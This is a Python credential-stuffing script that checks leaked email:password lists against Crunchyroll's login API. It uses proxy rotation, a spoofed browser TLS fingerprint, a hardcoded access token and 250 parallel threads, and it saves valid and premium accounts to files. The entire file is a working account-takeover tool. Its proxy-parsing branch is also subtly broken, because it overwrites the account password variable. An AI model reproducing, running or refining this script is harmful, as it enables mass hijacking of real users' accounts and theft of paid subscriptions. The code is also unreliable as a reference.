import os
import time
import random
import ctypes
import concurrent.futures
import requests
import datetime
from colorama import Fore, Style
from uuid import uuid4
from pystyle import Write, Colors
from tls_client import Session
from concurrent import futures


red = Fore.RED
yellow = Fore.YELLOW
green = Fore.GREEN
blue = Fore.BLUE
pretty = Fore.LIGHTMAGENTA_EX + Fore.LIGHTCYAN_EX
cyan = Fore.CYAN
gray = Fore.LIGHTBLACK_EX + Fore.WHITE
reset = Fore.RESET
pink = Fore.LIGHTGREEN_EX + Fore.LIGHTMAGENTA_EX


invalid = 0
valid = 0
custom = 0
premium = 0
proxy_error = 0
accounts_processed = 0

start_time = time.time()
ctypes.windll.kernel32.SetConsoleTitleW(f'Crunchyroll Account Checker | Valid: {valid} | Invalid: {invalid} | Custom: {custom} | Premium: {premium} | Proxy Error: {proxy_error}')

def update_console_title():
    """Updates the console title with stats."""
    global valid, invalid, custom, premium, proxy_error, accounts_processed
    elapsed_time = time.time() - start_time
    cpm = int((accounts_processed / elapsed_time) * 60) if elapsed_time > 0 else 0
    title = f'Crunchyroll Account Checker | Valid: {valid} | Invalid: {invalid} | Custom: {custom} | Premium: {premium} | Proxy Error: {proxy_error} | CPM: {cpm}'
    ctypes.windll.kernel32.SetConsoleTitleW(title)

def my_ui():
    """Displays the program's UI header."""
    Write.Print(f"""
    K   K  KKKKK K      K   KKKK    KKKKK  
    K  K   K      K    K  K     K  K
    K K    K       K  K  K       K K
    KK     KKKKK    KK  K        K  KKKKK
    K K    K        K   K                K
    K  K   K        K    K      K        K
    K   K  KKKKK    K      KKKK     KKKKK   
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
""", Colors.yellow_to_red, interval=0.000)

my_ui()
time.sleep(3)

def get_time_rn():
    """Returns the current time in HH:MM:SS format."""
    return datetime.datetime.now().strftime("%H:%M:%S")

def read_proxies():
    """Reads proxies from 'proxies.txt' file."""
    if os.path.exists("proxies.txt"):
        with open("proxies.txt", "r") as file:
            return [line.strip() for line in file.readlines()]
    return []

def log_result(filename, content):
    """Logs the results to the specified file."""
    folder = "Checked"
    if not os.path.exists(folder):
        os.makedirs(folder)
    with open(os.path.join(folder, filename), "a+", encoding='utf-8') as file:
        file.write(content + "\n")

def crunchy_checker(email, password):
    """Checks Crunchyroll account credentials."""
    global invalid, valid, custom, premium, proxy_error, accounts_processed
    try:
        proxy_list = read_proxies()
        proxy = random.choice(proxy_list) if proxy_list else None

        session = Session(client_identifier="chrome_114", random_tls_extension_order=True)
        if proxy:
            proxy_parts = proxy.split(":")
            if len(proxy_parts) == 2:
                session.proxies = {
                    "http": f"http://{proxy}",
                    "https": f"http://{proxy}"
                }
            elif len(proxy_parts) == 4:
                username, password, ip, port = proxy_parts
                session.proxies = {
                    "http": f"http://{username}:{password}@{ip}:{port}",
                    "https": f"http://{username}:{password}@{ip}:{port}"
                }

        guid = str(uuid4())

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept-Language": "en-US"
        }

        payload = f"device_type=com.crunchyroll.windows.desktop&device_id={guid}&access_token=LNDJgOit5yaRIWN"
        req = session.post("https://api.crunchyroll.com/start_session.0.json", headers=headers, data=payload)
        session_id = req.json().get('data', {}).get('session_id')

        if not session_id:
            raise ValueError("Failed to retrieve session ID")

        payload = {
            'account': email,
            'password': password,
            'session_id': session_id,
            'locale': 'enUS',
            'version': '1.3.1.0',
            'connectivity_type': 'ethernet'
        }

        login = session.post("https://api.crunchyroll.com/login.0.json", headers=headers, data=payload)
        login_data = login.json()

        if "Incorrect login information" in login.text:
            invalid += 1
            accounts_processed += 1
            print(f"{reset}[ {cyan}{get_time_rn()}{reset} ] {gray}({red}-{gray}) {pretty}Invalid {gray}|{pink} {email}:{password}{gray}")
            update_console_title()
            return

        if '"premium":""' in login.text:
            custom += 1
            accounts_processed += 1
            print(f"{reset}[ {cyan}{get_time_rn()}{reset} ] {gray}({blue}~{gray}) {pretty}Custom {gray}|{pink} {email}:{password}{gray}")
            log_result("custom_crunchyroll.txt", f"{email}:{password} | A2F")
            update_console_title()
            return

        if 'user_id' not in login.text:
            raise ValueError("Invalid response format")

        valid += 1
        accounts_processed += 1
        subscription = login_data["data"]["user"].get("access_type", "unknown")

        if subscription == "premium":
            premium += 1
            print(f"{reset}[ {cyan}{get_time_rn()}{reset} ] {gray}({green}+{gray}) {pretty}Valid {gray}|{pink} {email}:{password} | {green}Premium")
            log_result("good_crunchyroll_premium.txt", f"{email}:{password} | Subscription: {subscription}")
        else:
            print(f"{reset}[ {cyan}{get_time_rn()}{reset} ] {gray}({green}+{gray}) {pretty}Valid {gray}|{pink} {email}:{password} | {yellow}No Premium")
            log_result("good_crunchyroll.txt", f"{email}:{password} | Subscription: {subscription}")

        update_console_title()

    except Exception as e:
        proxy_error += 1
        print(f"{red}[Error] {str(e)}")
        update_console_title()

def process_account(email, password):
    """Process each account by checking credentials."""
    crunchy_checker(email, password)

def main():
    """Main function to manage account processing."""
    accounts = []
    if os.path.exists('accounts.txt'):
        with open('accounts.txt', 'r') as file:
            accounts = [line.strip().split(":") for line in file if ':' in line]

    max_threads = 250
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = [executor.submit(process_account, email, password) for email, password in accounts]
        concurrent.futures.wait(futures)

if __name__ == "__main__":
    main()
